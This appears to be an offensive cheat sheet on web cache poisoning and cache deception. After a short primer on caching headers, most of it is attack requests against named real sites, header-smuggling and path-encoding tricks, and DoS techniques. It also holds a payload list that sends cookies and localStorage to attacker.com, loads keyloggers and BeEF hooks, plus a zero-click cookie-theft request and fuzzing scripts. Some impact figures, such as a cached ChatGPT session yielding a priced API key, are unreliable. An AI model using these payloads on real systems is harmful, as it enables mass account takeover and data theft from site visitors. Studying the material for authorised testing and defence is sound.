## Overview

### What is HTTP Caching?

Caching is a technique that stores a copy of a given resource and serves it back when requested. When a web cache has a requested resource in its store, it intercepts the request and returns its copy instead of re-downloading from the originating server.

**Goals:**
- Reduce server load (the server doesn't have to serve all clients itself)
- Improve performance (it takes less time to transmit the resource back)

### Types of Caches

**Private Browser Caches:**
A private cache is dedicated to a single user. A browser cache holds all documents downloaded via HTTP by the user for back/forward navigation, saving, viewing-as-source, etc.

**Shared Proxy Caches:**
A shared cache stores responses to be reused by more than one user. ISPs or companies might have web proxies as part of their local network infrastructure to serve many users, reducing network traffic and latency.

### Cache Keys and Targets

**Primary Cache Keys:**
- Request method
- Target URI

**Cacheable Methods:**
According to [RFC7231](https://tools.ietf.org/html/rfc7231#section-4.2.3), `GET`, `HEAD`, and `POST` are defined as cacheable, though most implementations only support `GET` and `HEAD`.

**Common Cacheable Entries:**
- `200 OK` responses to GET requests (HTML, images, files)
- `301 Moved Permanently` redirects
- `404 Not Found` error pages
- `206 Partial Content` responses

### The Vary Header

The `Vary` HTTP response header determines how to match future request headers to decide whether a cached response can be used. When a cache receives a request with a `Vary` header, it must not use that cached response unless all header fields nominated by the `Vary` header match in both the original (cached) request and the new request.

---

## Web Cache Poisoning

### Introduction

**Web Cache Poisoning** is an attack where an attacker sends a request that causes a harmful response to be saved in the cache and served to other users. The objective is to inject malicious content into the cache that will be distributed to legitimate users.

**Key Difference:**
- **Cache Poisoning:** Attacker causes the application to store malicious content in the cache, served to other users
- **Cache Deception:** Attacker causes the application to store sensitive content belonging to another user, which the attacker then retrieves

### Attack Phases

1. **Identify Unkeyed Inputs:** Find parameters that alter the response but aren't part of the cache key
2. **Exploit the Unkeyed Inputs:** Determine how to manipulate these parameters to inject malicious content
3. **Get the Response Cached:** Ensure the poisoned response is stored and served to victims

---

## Cache Control Headers

### Cache-Control Directives (HTTP/1.1)

**No Caching:**
```http
Cache-Control: no-store
```
The cache should not store anything about the client request or server response.

**Cache but Revalidate:**
```http
Cache-Control: no-cache
```
A cache will send the request to the origin server for validation before releasing a cached copy.

**Public Cache:**
```http
Cache-Control: public
```
The response may be cached by any cache, even if normally non-cacheable.

**Private Cache:**
```http
Cache-Control: private
```
The response is intended for a single user only and must not be stored by a shared cache.

**Expiration:**
```http
Cache-Control: max-age=31536000
```
Specifies the maximum time in seconds a resource will be considered fresh.

**Validation:**
```http
Cache-Control: must-revalidate
```
The cache must verify the status of stale resources before using them.

### Pragma Header (HTTP/1.0)

```http
Pragma: no-cache
```
Behaves the same as `Cache-Control: no-cache` for backwards compatibility with HTTP/1.0 clients.

### Other Important Headers

**Expires:**
```http
Expires: Wed, 21 Oct 2026 07:28:00 GMT
```
Defines an absolute expiration time for the resource.

**Date:**
```http
Date: Wed, 21 Oct 2025 07:28:00 GMT
```
The date and time the message was sent.

**Age:**
```http
Age: 3600
```
Defines the time in seconds the object has been in the proxy cache.

---

## Cache Validation

### Strong Validation - ETag

The `ETag` response header is an opaque-to-the-useragent value used as a **strong** validator:

```http
ETag: "33a64df551425fcc55e4d42a148795d9f25f89d4"
```

Client can validate with:
```http
If-None-Match: "33a64df551425fcc55e4d42a148795d9f25f89d4"
```

### Weak Validation - Last-Modified

```http
Last-Modified: Wed, 21 Oct 2025 07:28:00 GMT
```

Client can validate with:
```http
If-Modified-Since: Wed, 21 Oct 2025 07:28:00 GMT
```

**Validation Responses:**
- `200 OK` - Resource changed, full response
- `304 Not Modified` - Resource unchanged, use cached version

---

## Discovery Techniques

### Step 1: Check HTTP Cache Headers

Look for headers indicating cached responses:
- `X-Cache: hit` / `X-Cache: miss`
- `CF-Cache-Status: HIT` / `CF-Cache-Status: MISS`
- `Cache-Control` directives
- `Age` header presence
- `Vary` header specifications

### Step 2: Test Caching Error Codes

Send requests with malformed headers to trigger error responses (e.g., 400 Bad Request). If subsequent normal requests return the same error, the cache is vulnerable:

```http
GET / HTTP/1.1
Host: target.com
X-Bad-Header: ;;;invalid
```

**Note:** Some caches don't cache error codes, so this test may not always be reliable.

### Step 3: Identify Unkeyed Inputs

Use tools like [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) to brute-force parameters and headers that change responses without affecting the cache key.

**Common Unkeyed Headers:**
- `X-Forwarded-Host`
- `X-Forwarded-For`
- `X-Forwarded-Scheme`
- `X-Forwarded-Server`
- `X-Host`
- `X-HTTP-Method-Override`
- `X-Original-URL`
- `X-Rewrite-URL`

### Step 4: Test with Different Browsers

Always test cache poisoning with different browsers/contexts to ensure headers aren't unexpectedly keyed.

---

## Exploitation Methods

### Basic Cache Poisoning

**Technique:** Inject XSS payload via unkeyed header

```http
GET /en?region=uk HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: evil.com
```

Response:
```http
HTTP/1.1 200 OK
Cache-Control: public, no-cache
...
<meta property="og:image" content="https://evil.com/img/bar.png" />
```

**XSS Payload:**
```http
GET /en?region=uk HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: a."><script>alert(1)</script>
```

Response:
```http
HTTP/1.1 200 OK
Cache-Control: public, no-cache
...
<meta property="og:image" content="https://a."><script>alert(1)</script>/img/bar.png" />
```

### Seizing the Cache

**Technique:** Replace legitimate resources with attacker-controlled content

```http
GET / HTTP/1.1
Host: unity3d.com
X-Host: evil.com
```

Response:
```http
HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Cache-Control: public, max-age=1800
...
<script src="https://evil.com/x.js"></script>
```

### Selective Poisoning

**Technique:** Target specific user agents via the `Vary` header

```http
GET / HTTP/1.1
Host: redacted.com
User-Agent: Mozilla/5.0 Firefox/60.0
X-Forwarded-Host: a"><iframe onload=alert(1)>
```

Response:
```http
HTTP/1.1 200 OK
Vary: User-Agent, Accept-Encoding
...
<link rel="canonical" href="https://a"><iframe onload=alert(1)>
```

### Chaining Unkeyed Inputs

**Step 1: Cookie Poisoning**
```http
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
```

Response:
```http
HTTP/1.1 200 OK
Set-Cookie: locale=en; domain=attacker.com
```

**Step 2: Redirect Manipulation**
```http
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Scheme: nothttps
```

Response:
```http
HTTP/1.1 301 Moved Permanently
Location: https://redacted.net
```

**Step 3: Combined Exploit**
```http
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps
```

Response:
```http
HTTP/1.1 301 Moved Permanently
Location: https://attacker.com/en
```

### Route Poisoning

**Technique:** Redirect to attacker-controlled subdomain

```http
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Server: evil
```

Response:
```http
HTTP/1.1 404 Not Found
CF-Cache-Status: MISS
...
<title>HubSpot - Page not found</title>
<p>The domain evil does not exist in our system.</p>
```

**Exploit:** Register a HubSpot account, place payload, then:

```http
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Host: attacker-hubspot.hs-sites.com
```

Response:
```http
HTTP/1.1 200 OK
...
<script>alert(document.domain)</script>
```

### Hidden Route Poisoning

**Technique:** Exploit custom domain redirects

```http
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: attacker.ghost.io
```

Response:
```http
HTTP/1.1 302 Found
Location: http://attacker-blog.com/
```

### Cookie-Handling Vulnerabilities

**Technique:** Inject XSS via reflected cookies

```http
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=valid; fehost=asd"%2balert(1)%2b"
```

Response:
```http
HTTP/1.1 200 OK
Cache-Control: public
...
<img src="https://asd"+alert(1)+""/>
```

**Note:** Regular requests from users with the vulnerable cookie will clean the cache.

### Fat GET Attack

**Technique:** Send GET with body to confuse cache/origin

```http
GET /contact/report-abuse?report=attacker HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=victim-username
```

- **Cache** uses URL parameter: `report=attacker`
- **Origin** uses body parameter: `report=victim-username`
- Anyone accessing `/contact/report-abuse?report=attacker` performs action on `victim-username`

### Parameter Cloaking

**Technique:** Use semicolon delimiter in Ruby servers

```http
GET /path?keyed_param=value;unkeyed_param=malicious HTTP/1.1
Host: vulnerable.com
```

- Ruby interprets `;` as parameter separator like `&`
- Cache may key on `keyed_param` only
- Origin processes both parameters

### HTTP Method Override Attack (HMO)

**Technique:** Use method override headers to trigger errors

```http
GET /blogs HTTP/1.1
Host: redacted.com
X-HTTP-Method-Override: POST
```

Response:
```http
HTTP/1.1 405 Method Not Allowed
Cache: hit
```

**Alternative Headers:**
- `X-HTTP-Method`
- `X-Method-Override`
- `_method` parameter

---

## Cache Poisoning via URL Discrepancies

### Delimiters

Different frameworks interpret URL delimiters differently:

**Semicolon (;) - Spring Matrix Variables:**
```
/hello;var=a/world;var1=b → /hello/world
```

**Dot (.) - Ruby on Rails Format:**
```
/MyAccount.css → /MyAccount
```

**Null Byte (%00) - OpenLiteSpeed:**
```
/MyAccount%00aaa → /MyAccount
```

**Newline (%0a) - Nginx:**
```
/users/MyAccount%0aaaa → /account/MyAccount
```

**Testing Process:**
1. Find non-cacheable endpoint
2. Append random suffix with potential delimiter
3. Compare responses to identify working delimiters

### Encodings

**URL Encoding Inconsistencies:**

```http
GET /myAccount%3Fparam HTTP/1.1
```

- **Cache:** Stores with key `/myAccount%3Fparam`
- **Origin:** Decodes to `/myAccount?param`

**Testing:**
1. Request path without encoding
2. Request same path with encoding
3. Check if encoded response came from cache

### Dot Segment Normalization

**Path Traversal via Dots:**

```
/static/../home/index
/aaa../home/index
```

- **Cache:** May store literal path
- **Origin:** Resolves to `/home/index`

### Static Resource Exploitation

#### Extension-Based Caching

**Common Cached Extensions:**
7z, csv, gif, midi, png, tif, zip, avi, doc, gz, mkv, ppt, tiff, zst, avif, docx, ico, mp3, pptx, ttf, apk, dmg, iso, mp4, ps, webm, bin, ejs, jar, ogg, rar, webp, bmp, eot, jpg, otf, svg, woff, bz2, eps, jpeg, pdf, svgz, woff2, class, exe, js, pict, swf, xls, css, flac, mid, pls, tar, xlsx

**Exploit:**
```http
GET /home$image.png HTTP/1.1
```

- **Cache:** Stores `/home$image.png` (sees .png)
- **Origin:** Returns `/home` (ignores extension)

#### Static Directory Exploitation

**Common Static Directories:**
/static, /assets, /wp-content, /media, /templates, /public, /shared

**Exploit with Traversal:**
```http
GET /home/..%2fstatic/something HTTP/1.1
```

- **Cache:** Stores `/static/something`
- **Origin:** Returns `/home`

**Alternative:**
```http
GET /static/..%2Fhome HTTP/1.1
GET /static/..%5Chome HTTP/1.1
```

- **Cache:** Stores as-is
- **Origin:** Resolves to `/home`

#### Well-Known Static Files

**Always Cached:**
- `/robots.txt`
- `/favicon.ico`
- `/index.html`

**Exploit:**
```http
GET /home/..%2Frobots.txt HTTP/1.1
```

- **Cache:** Stores `/robots.txt`
- **Origin:** Returns `/home`

---

## Cache Poisoning to DoS

### HTTP Header Oversize (HHO)

Send header larger than web server supports but smaller than cache server:

```http
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Header: [Very long value exceeding server limit]
```

Response cached:
```http
HTTP/1.1 400 Bad Request
Cache: hit
```

### HTTP Meta Character (HMC)

Send headers with harmful meta characters:

```http
GET / HTTP/1.1
Host: redacted.com
X-Meta-Header: Bad Chars\n \r
```

**Minimal Payload:**
```http
\:
```

### Unexpected Content-Type

```http
GET /api/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```

Response:
```http
HTTP/2 400 Bad Request
Cache: hit
```

### Unkeyed Header Triggering Errors

Some headers trigger errors when present:

```http
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Redirect-Location: something
```

Response:
```http
HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```

### Unkeyed Port

```http
GET /index.html HTTP/1.1
Host: redacted.com:1
```

Response:
```http
HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```

### Long Redirect DoS

```http
GET /login?x=[very long URL] HTTP/1.1
Host: www.cloudflare.com
```

Response:
```http
HTTP/1.1 301 Moved Permanently
Location: /login/?x=[very long URL]
Cache: hit
```

Subsequent request:
```http
GET /login/?x=[very long URL] HTTP/1.1

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```

### Host Header Case Normalization

```http
GET /img.png HTTP/1.1
Host: CDN.redacted.com
```

Response:
```http
HTTP/1.1 404 Not Found
Cache: miss
```

### Path Normalization DoS

```http
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com
```

Response:
```http
HTTP/1.1 404 Not Found
Cache: miss
```

- **Cache:** Decodes and stores `/api/v1.1/user`
- **Origin:** Returns 404 for encoded path

### Fat GET DoS

```http
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz
```

Response:
```http
HTTP/2 403 Forbidden
Cache: hit
```

---

## Advanced Exploitation Scenarios

### Cache Poisoning via CDNs

**Scenario:** CDN caches path traversal without normalization

```http
GET /share/%2F..%2Fapi/auth/session?cachebuster=123 HTTP/1.1
Host: chat.openai.com
```

- **CDN:** Caches anything under `/share/` without decoding `%2F..%2F`
- **Origin:** Decodes and returns `/api/auth/session` with auth token

### Header-Reflection XSS + CDN-Assisted Cache Seeding

**Attack Flow:**

1. Set malicious `User-Agent` in browser/proxy
2. Use Burp "Send group in parallel" (single-packet mode):

**Request 1:**
```http
GET /static/app.js HTTP/1.1
Host: target.com
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?c='+document.cookie</script>
```

**Request 2 (immediately after):**
```http
GET / HTTP/1.1
Host: target.com
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?c='+document.cookie</script>
```

- CDN auto-caches `.js` requests
- Race condition causes main HTML to be cached with reflected `User-Agent`
- Subsequent visitors get XSS payload from cache

**Impact:** Zero-click Account Takeover if cookies aren't HttpOnly

### Sitecore Pre-Auth HTML Cache Poisoning

**Technique:** Exploit XAML handlers to write to HtmlCache

```http
POST /-/xaml/Sitecore.Shell.Xaml.WebControl HTTP/1.1
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>...payload...</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```

Writes arbitrary HTML under attacker-chosen cache key.

### CSPT-Assisted Authenticated Cache Poisoning

**Attack Chain:**

1. Sensitive API endpoint requires auth header:
```http
GET /v1/token HTTP/1.1
Host: api.example.com
X-Auth-Token: <victim-token>

HTTP/1.1 200 OK
Cache-Control: no-cache, no-store
{"token":"eyJhbGc..."}
```

2. Static extension triggers caching:
```http
GET /v1/token.css HTTP/1.1
Host: api.example.com
X-Auth-Token: <victim-token>

HTTP/1.1 200 OK
Cache-Control: max-age=86400, public
X-Cache: Hit from cdn
{"token":"eyJhbGc..."}
```

3. SPA with CSPT vulnerability:
```javascript
const userId = urlParams.get('userId');
const apiUrl = `https://api.example.com/v1/users/info/${userId}`;
fetch(apiUrl, { headers: { 'X-Auth-Token': victimToken }});
```

4. Exploit URL:
```
https://example.com/user?userId=../../../v1/token.css
```

5. SPA makes authenticated request to:
```
https://api.example.com/v1/token.css
```

6. Response cached publicly, attacker retrieves without auth:
```http
GET /v1/token.css HTTP/1.1
Host: api.example.com

HTTP/1.1 200 OK
X-Cache: Hit from cdn
{"token":"eyJhbGc..."}
```

**Impact:** Account Takeover via token theft

---

## Web Cache Deception

### Introduction

**Web Cache Deception (WCD)** is an attack where an attacker tricks a caching proxy into improperly storing private information and serving it to other users. The attacker deceives the cache into treating sensitive dynamic content as static cacheable resources.

### Attack Prerequisites

**Conditions for WCD:**

1. Cache proxy configured to cache files based on extension, not Content-Type
2. Response has `text/html` Content-Type but cacheable extension in URL
3. Sensitive data gets cached (header shows `HIT` not `MISS`)
4. Application doesn't return 404 for non-existent paths
5. Response lacks cache prevention headers: `Cache-Control: no-cache`, `max-age=0`, `private`, `no-store`

### Attack Flow

**Step 1:** Attacker entices victim to visit:
```
https://www.example.com/my_profile/test.jpg
```

- Application ignores `test.jpg` and loads profile page
- Cache sees `.jpg` extension and caches the response
- Response contains victim's sensitive information

**Step 2:** Attacker requests cached resource:
```
https://www.example.com/my_profile/test.jpg
```

- Cache returns victim's profile page
- Attacker gains access to sensitive information

### Manual Testing Process

**Step 1:** Check caching with non-existent static file:
```
GET /profile/payments/nonexistent.css HTTP/1.1
Host: target.com
```

**Step 2:** Verify response:
- If response is NOT 404
- Payment information still displayed
- `Cf-Cache-Status: HIT` header present
- Attack is applicable

**Step 3:** Open URL in incognito/different browser to confirm cache

### Test Cases

**Basic Extension Appending:**
```
example.com/profile.php/nothing.css
example.com/profile.php.css
example.com/profile.php.js
example.com/profile.php.png
```

**Path Traversal with Extension:**
```
example.com/profile.php/../nothing.css
example.com/profile.php/%2e%2e/test.js
example.com/profile.php/..%2Ftest.css
```

**Semicolon Delimiter:**
```
example.com/profile/setting/.js
example.com/profile/setting/;.js
example.com/profile/setting/;.css
```

**Lesser-Known Extensions:**
```
example.com/profile.php/test.avif
example.com/profile.php/test.webp
example.com/profile.php/test.woff2
```

### Example Attack

**Normal Request:**
```http
GET /profile/setting HTTP/1.1
Host: www.vuln.com
```

Response:
```http
HTTP/2 200 OK
Content-Type: text/html
Cf-Cache-Status: MISS
[Sensitive user data]
```

**Deception Request:**
```http
GET /profile/setting/.js HTTP/1.1
Host: www.vuln.com
```

Response:
```http
HTTP/2 200 OK
Content-Type: text/html
Cf-Cache-Status: HIT
[Sensitive user data - now cached!]
```

**Attacker Retrieval (Incognito):**
```http
GET /profile/setting/.js HTTP/1.1
Host: www.vuln.com
```

Gets victim's cached sensitive data.

---

## HTTP Request Smuggling Integration

### Cache Poisoning via Smuggling

**Technique:** Use request smuggling to inject malicious content into cache

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: attacker.com
Content-Length: 10

x=
```

- Front-end sees single POST request
- Back-end sees POST + GET to `/admin`
- Poisoned `/admin` response gets cached

### Cache Deception via Smuggling

**Technique:** Smuggle request to make victim's sensitive page appear static

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /profile.css HTTP/1.1
Host: vulnerable.com
Foo: bar
```

- Victim's subsequent request gets appended to smuggled request
- Their profile page served with `.css` path
- Cached as static resource
- Attacker retrieves from cache

---

## Bypasses and Evasion

### Cache Key Manipulation

**Unkeyed Port Bypass:**
```http
GET /index.html HTTP/1.1
Host: target.com:8080
```

If port isn't in cache key but reflected in response, can poison specific port.

**Query String Manipulation:**
```
/profile?cachebuster=123
/profile?cb=456&param=value
```

Add unkeyed parameters to force new cache entries.

### Encoding Bypasses

**Double URL Encoding:**
```
/profile%252e%252e/static/file.js
```

**Mixed Encoding:**
```
/profile%2e%2e%5c/static/file.js
/profile..%2fstatic/file.js
```

**Unicode Normalization:**
```
/profile%u002e%u002e/static/file.js
```

### Header Manipulation

**Case Variation:**
```http
X-Forwarded-Host: attacker.com
x-forwarded-host: attacker.com
X-FORWARDED-HOST: attacker.com
```

**Header Injection:**
```http
X-Forwarded-Host: legitimate.com
X-Forwarded-Host: attacker.com
```

Some caches use first header, some use last.

**Whitespace Abuse:**
```http
X-Forwarded-Host: attacker.com
X-Forwarded-Host:attacker.com
X-Forwarded-Host:  attacker.com
```

### Method Override Variations

```http
X-HTTP-Method-Override: POST
X-Method-Override: PUT
_method=DELETE
X-HTTP-Method: PATCH
```

### User-Agent Targeting

If `Vary: User-Agent` is set, target specific browsers:

```http
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)
```

---

## Payloads

### XSS Payloads for Cache Poisoning

```javascript
// Basic alert
<script>alert(document.domain)</script>

// Cookie exfiltration
<script>new Image().src='https://attacker.com?c='+document.cookie</script>

// Advanced exfiltration with timing
<script>fetch('https://attacker.com',{method:'POST',body:JSON.stringify({cookies:document.cookie,localStorage:localStorage,origin:location.origin})})</script>

// DOM-based redirect
<script>location='https://attacker.com/phish?victim='+document.domain</script>

// Keylogger injection
<script src="https://attacker.com/keylogger.js"></script>

// BeEF hook
<script src="https://attacker.com:3000/hook.js"></script>

// CSS injection for history sniffing
<link rel="stylesheet" href="https://attacker.com/steal.css">

// SVG-based payload
<svg/onload=alert(document.domain)>

// Event handler abuse
"><img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>

// Polyglot payload
'"><script>alert(String.fromCharCode(88,83,83))</script>
```

---

## Higher Impact Scenarios

### Account Takeover (ATO)

**Via Cache Deception:**
1. Trick victim into loading: `/account/api/token.css`
2. Cache stores victim's authentication token
3. Retrieve token from cache: `GET /account/api/token.css`
4. Use token to impersonate victim

**Via Cache Poisoning:**
1. Poison login page with credential-stealing JavaScript
2. Victims submit credentials to attacker-controlled endpoint
3. Attacker logs in as victims

### Mass User Compromise

**Scenario:** XSS in highly-trafficked page

1. Poison homepage cache with XSS
2. Set long cache duration (`max-age=31536000`)
3. Every visitor executes malicious payload
4. Collect credentials, tokens, session data

**Impact Multiplier:**
- Homepage visitors: 100,000/day
- Cache duration: 7 days
- Total victims: 700,000+

### API Key Theft

**ChatGPT Example:**
```http
GET /share/%2F..%2Fapi/auth/session?cb=123 HTTP/1.1
Host: chat.openai.com
```

- CDN caches anything under `/share/`
- Path traversal bypasses auth
- Response contains OpenAI API key
- $18/1M tokens value per key

### Internal Network Access

**Route Poisoning to Admin:**
```http
GET / HTTP/1.1
Host: public.example.com
X-Forwarded-Server: admin-internal.local
```

- Cache stores redirect to internal admin
- External users gain access to internal resources
- Bypass network segmentation

### Supply Chain Attack

**Technique:** Poison CDN serving multiple sites

1. Find shared CDN resource: `cdn.example.com/common.js`
2. Poison with malicious JavaScript
3. All sites using this CDN serve malicious code
4. Compromise thousands of websites simultaneously

### Denial of Service (DoS)

**Mass Cache Poisoning:**
1. Poison 1000+ popular URLs with 400/500 errors
2. Application unavailable for cache duration
3. Financial impact: downtime × revenue/hour

**Example:**
- E-commerce site
- $50,000/hour revenue
- 4-hour cache poisoning
- **Impact:** $200,000 loss

### GDPR/Privacy Violations

**Cache Deception on PII:**
1. Cache victim's personal data: `/profile/data.json`
2. Personal data exposed publicly
3. GDPR Article 5 violation (data protection principles)
4. **Fines:** Up to €20 million or 4% of annual global turnover

**Exposed Data Types:**
- Full name, email, phone numbers
- Home addresses
- Payment card details
- Social security numbers
- Medical records
- Biometric data

### Business Email Compromise (BEC)

**Attack Chain:**

1. Cache poison corporate email interface
2. Inject JavaScript to intercept sent emails
3. Modify wire transfer instructions in real-time
4. Redirect payments to attacker accounts

**Real-World Impact:**
- Average BEC loss: $120,000 per incident
- FBI IC3 reported $2.4B in BEC losses (2021)

### OAuth Token Theft

**Scenario:** Cache OAuth callback with access token

```http
GET /oauth/callback?code=AUTHORIZATION_CODE&state=xyz.css HTTP/1.1
Host: app.example.com
```

- Application exchanges code for access_token
- Response cached with `.css` extension
- Attacker retrieves access_token from cache
- Full account access without credentials

### Session Fixation via Cache

**Attack:**

1. Generate session ID: `SESSIONID=attacker_controlled`
2. Poison login page to set this session
3. Victim logs in with fixed session
4. Attacker uses same session ID to access account

```http
GET /login HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: attacker.com

Set-Cookie: SESSIONID=attacker_controlled; Domain=.vulnerable.com
```

### Multi-Stage Attacks

**Stage 1: Reconnaissance**
- Cache poison to load external JavaScript
- JavaScript fingerprints victim environment
- Collects: browser version, plugins, OS, internal IPs

**Stage 2: Targeted Exploit**
- Analyze collected data
- Identify vulnerable software versions
- Deliver browser exploit via cached page

**Stage 3: Persistence**
- Install web-based backdoor
- Establish C2 channel via cached WebSocket
- Maintain access beyond cache expiration

### Zero-Click Account Takeover

**Prerequisites:**
- Header reflection XSS
- Cookies without HttpOnly flag
- Popular page with long cache duration

**Attack:**
```http
GET /popular-page.html HTTP/1.1
Host: target.com
User-Agent: Mozilla</script><script>fetch('https://attacker.com',{method:'POST',body:document.cookie})</script>
```

**Result:**
- Every user visiting page has cookies stolen
- No user interaction required
- Attacker gains thousands of session tokens
- Mass account takeover

---

## Tools and Automation

### Detection Tools

**Param Miner (Burp Extension)**
```
Install from BApp Store
Right-click request → Extensions → Param Miner → Guess headers
Right-click request → Extensions → Param Miner → Guess GET parameters
```

**Web Cache Vulnerability Scanner (WCVS)**
```bash
# Installation
go install github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest

# Basic scan
wcvs -u https://target.com

# With custom headers
wcvs -u https://target.com -H "Authorization: Bearer TOKEN"

# Verbose mode
wcvs -u https://target.com -v

# Custom wordlist
wcvs -u https://target.com -w custom-headers.txt
```

**Toxicache**
```bash
# Installation
go install github.com/xhzeem/toxicache@latest

# Scan from file
toxicache -l urls.txt

# Single target
toxicache -u https://target.com

# Multiple injection points
toxicache -u https://target.com -t all
```

**Web Cache Deception Scanner (Burp Extension)**
```
1. Install from BApp Store
2. Navigate to Target tab
3. Right-click target → Extensions → Web Cache Deception Scanner
4. Select "Web Cache Deception Test"
5. Review results in extension output
```

### Parameter Discovery

**Arjun**
```bash
# GET parameters
python3 arjun.py -u https://target.com/api/endpoint --get

# POST parameters
python3 arjun.py -u https://target.com/api/endpoint --post

# Custom wordlist
python3 arjun.py -u https://target.com -w params.txt

# With delay
python3 arjun.py -u https://target.com --delay 2
```

**ParamSpider**
```bash
# Basic scan
python3 paramspider.py --domain target.com

# Output to file
python3 paramspider.py --domain target.com --output params.txt

# Exclude specific parameters
python3 paramspider.py --domain target.com --exclude id,page
```

**Parth**
```bash
# Discover hidden paths
python3 parth.py -t target.com

# With custom wordlist
python3 parth.py -t target.com -w wordlist.txt
```

**Parameth**
```bash
# Basic discovery
python parameth.py -u https://target.com/endpoint

# POST method
python parameth.py -u https://target.com/endpoint -m POST

# Custom headers
python parameth.py -u https://target.com/endpoint -H "Authorization: Bearer TOKEN"
```

### Testing Scripts

**Basic Cache Poisoning Test (Bash)**
```bash
#!/bin/bash
URL=$1
PAYLOAD=$2

# Test X-Forwarded-Host
curl -s -H "X-Forwarded-Host: $PAYLOAD" "$URL" -o /tmp/response1.html
sleep 2
curl -s "$URL" -o /tmp/response2.html

if diff /tmp/response1.html /tmp/response2.html > /dev/null; then
    echo "[+] Cache poisoned with X-Forwarded-Host"
else
    echo "[-] Not vulnerable to X-Forwarded-Host poisoning"
fi
```

**Cache Deception Test (Python)**
```python
import requests
import time

def test_cache_deception(base_url, sensitive_path):
    extensions = ['.css', '.js', '.jpg', '.png', '.ico', '.woff', '.svg']
    
    for ext in extensions:
        test_url = f"{base_url}{sensitive_path}/{ext}"
        
        # First request
        r1 = requests.get(test_url)
        cache_status_1 = r1.headers.get('X-Cache', 'UNKNOWN')
        
        time.sleep(1)
        
        # Second request (should be cached)
        r2 = requests.get(test_url)
        cache_status_2 = r2.headers.get('X-Cache', 'UNKNOWN')
        
        if 'HIT' in cache_status_2 and r2.status_code == 200:
            print(f"[!] VULNERABLE: {test_url}")
            print(f"    Cache Status: {cache_status_2}")
            print(f"    Content-Type: {r2.headers.get('Content-Type')}")
            return True
    
    return False

# Usage
test_cache_deception("https://target.com", "/account/profile")
```

**Header Fuzzing Script**
```python
import requests

headers_list = [
    'X-Forwarded-Host', 'X-Forwarded-For', 'X-Forwarded-Proto',
    'X-Forwarded-Scheme', 'X-Forwarded-Server', 'X-Host',
    'X-Original-URL', 'X-Rewrite-URL', 'X-HTTP-Method-Override',
    'X-HTTP-Method', 'X-Method-Override', 'Forwarded',
    'True-Client-IP', 'X-Real-IP', 'X-Client-IP'
]

def fuzz_headers(url, payload):
    for header in headers_list:
        headers = {header: payload}
        try:
            r = requests.get(url, headers=headers, timeout=5)
            if payload in r.text:
                print(f"[+] Reflected in response: {header}")
                print(f"    Status: {r.status_code}")
                print(f"    Cache: {r.headers.get('X-Cache', 'N/A')}")
        except:
            continue

# Usage
fuzz_headers("https://target.com", "xss-test-payload")
```

### Burp Suite Configuration

**Match and Replace Rules for Testing:**

1. **Auto-add cache busting parameter:**
   - Type: Request header
   - Match: `^GET /(.*)$`
   - Replace: `GET /$1?cachebuster=$random_str$`

2. **Auto-inject XSS header:**
   - Type: Request header
   - Match: (leave empty to add to all requests)
   - Replace: `X-Forwarded-Host: "><script>alert(1)</script>`

3. **Force static extension:**
   - Type: Request first line
   - Match: `^GET (/[^ ]*) HTTP`
   - Replace: `GET $1$.css HTTP`

### Automated Exploitation Workflow

```bash
#!/bin/bash
# Complete cache poisoning workflow

TARGET=$1
OUTPUT_DIR="cache_poisoning_results"
mkdir -p $OUTPUT_DIR

echo "[*] Starting cache poisoning assessment for $TARGET"

# Step 1: Parameter discovery
echo "[+] Discovering parameters..."
arjun -u $TARGET --get -o $OUTPUT_DIR/params.txt

# Step 2: Cache detection
echo "[+] Detecting cache behavior..."
wcvs -u $TARGET > $OUTPUT_DIR/cache_detection.txt

# Step 3: Header fuzzing
echo "[+] Fuzzing headers..."
python3 header_fuzzer.py $TARGET > $OUTPUT_DIR/header_results.txt

# Step 4: Test cache deception
echo "[+] Testing cache deception..."
python3 cache_deception_test.py $TARGET > $OUTPUT_DIR/deception_results.txt

# Step 5: Generate report
echo "[+] Generating report..."
cat $OUTPUT_DIR/*.txt > $OUTPUT_DIR/full_report.txt

echo "[*] Assessment complete. Results in $OUTPUT_DIR/"
```

---

## Detection and Monitoring

### Server-Side Detection

**Cache Behavior Anomalies:**
```bash
# Monitor cache hit ratio drops
# Normal: 80-95% hit ratio
# Attack: Sudden drop to 20-40%

# Log analysis
grep "X-Cache: MISS" access.log | wc -l
grep "X-Cache: HIT" access.log | wc -l
```

